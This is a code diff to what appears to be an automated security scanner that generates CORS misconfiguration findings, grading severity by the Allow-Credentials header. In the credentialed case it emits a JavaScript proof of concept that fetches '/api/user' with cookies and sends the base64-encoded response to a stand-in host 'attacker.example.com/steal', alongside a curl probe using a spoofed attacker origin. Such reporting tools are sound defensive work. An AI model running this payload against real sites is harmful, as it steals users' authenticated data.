@@ -545,13 +545,23 @@ class ActionAgent:
             elif acao_value and acao_value != "*":
                 reflected_origin = acao_value
 
+        acac_raw = (
+            evidence.get("access_control_allow_credentials")
+            or headers.get("Access-Control-Allow-Credentials")
+            or headers.get("access-control-allow-credentials")
+            or ""
+        )
+        acac_true = str(acac_raw).strip().lower() == "true"
+        is_star = str(acao_value).strip() == "*"
+
         evidence_captured = bool(acao_value)
         if evidence_captured:
             evidence_block = (
                 f"# Captured Origin probe\n"
                 f"# Sent Origin header: {reflected_origin or 'https://evil-cors-test.example.com'}\n"
                 f"# Server responded:    Access-Control-Allow-Origin: {acao_value}\n"
-                f"# → Attacker-controlled / wildcard origin accepted."
+                f"# Access-Control-Allow-Credentials: {acac_raw or '(absent)'}\n"
+                f"# → {'Credentialed' if acac_true else ('Wildcard' if is_star else 'Reflected')} origin accepted."
             )
         else:
             # Caller gates on evidence_captured=False — do not emit contradiction
@@ -559,15 +569,35 @@ class ActionAgent:
                 "# [NO EVIDENCE CAPTURED — ACAO value missing from evidence headers]"
             )
 
+        if acac_true:
+            poc2 = (
+                '# PoC 2: Credentialed cross-origin read (ACAC=true confirmed)\n'
+                'fetch("' + location + '/api/user", { credentials: "include" })\n'
+                '  .then(r => r.text())\n'
+                '  .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
+            )
+            cors_severity = "High"
+        elif is_star:
+            poc2 = (
+                '# Note: ACAO=* without credentials — browsers reject credentialed\n'
+                '# requests with wildcard ACAO. Cookie theft via CORS is not enabled.\n'
+                '# Impact is limited to reading public cross-origin responses.'
+            )
+            cors_severity = "Low"
+        else:
+            poc2 = (
+                '# Note: Origin reflected without Allow-Credentials. Anonymous\n'
+                '# cross-origin JS can read the response; cookie-authenticated\n'
+                '# theft requires Access-Control-Allow-Credentials: true.'
+            )
+            cors_severity = "Medium"
+
         poc = (
             '# PoC 1: Verify CORS misconfiguration with curl\n'
             'curl -s -I -H "Origin: https://evil-attacker.example.com" \\\n'
             '  ' + location + ' | grep -i "access-control"\n'
             f'{evidence_block}\n\n'
-            '# PoC 2: Browser-based cross-origin data theft (if credentials are allowed)\n'
-            '# fetch("' + location + '/api/user", { credentials: "include" })\n'
-            '#   .then(r => r.text())\n'
-            '#   .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
+            f'{poc2}'
         )
 
         stack_key = self._best_stack_for_header(stack_keywords)
@@ -616,7 +646,7 @@ class ActionAgent:
 
         return {
             "finding_type":   "CORS Misconfiguration",
-            "severity":       "Medium",
+            "severity":       cors_severity,
             "location":       location,
             "attack_poc":     poc,
             "poc_type":       "curl",
